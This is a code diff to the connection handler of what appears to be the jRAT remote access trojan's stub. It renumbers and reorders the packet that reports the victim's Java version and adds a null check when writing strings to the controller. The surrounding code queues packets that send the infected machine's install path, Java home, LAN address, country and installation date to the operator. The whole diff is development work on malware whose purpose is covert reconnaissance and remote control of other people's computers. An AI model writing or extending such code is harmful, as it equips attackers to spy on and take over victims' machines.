@@ -29,7 +29,7 @@ import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
 import se.jrat.stub.packets.outgoing.Packet13Status;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
 import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
-import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
+import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
 import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
@@ -149,6 +149,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet6InitVersion());
 		addToSendQueue(new Packet7InitServerID());
 		addToSendQueue(new Packet8InitCountry());
+		addToSendQueue(new Packet9InitJavaVersion());
 
 
 
@@ -157,7 +158,6 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet23InitInstallPath(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));
 
-		addToSendQueue(new Packet25InitJavaVersion(System.getProperty("java.runtime.version")));
 
 		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
 
@@ -198,6 +198,10 @@ public class Connection implements Runnable {
 	}
 
 	public static void writeLine(String s) {
+		if (s == null) {
+			Main.debug("String is null!");
+			s = "";
+		}
 		try {
 			dos.writeShort(s.length());
 			dos.writeChars(s);
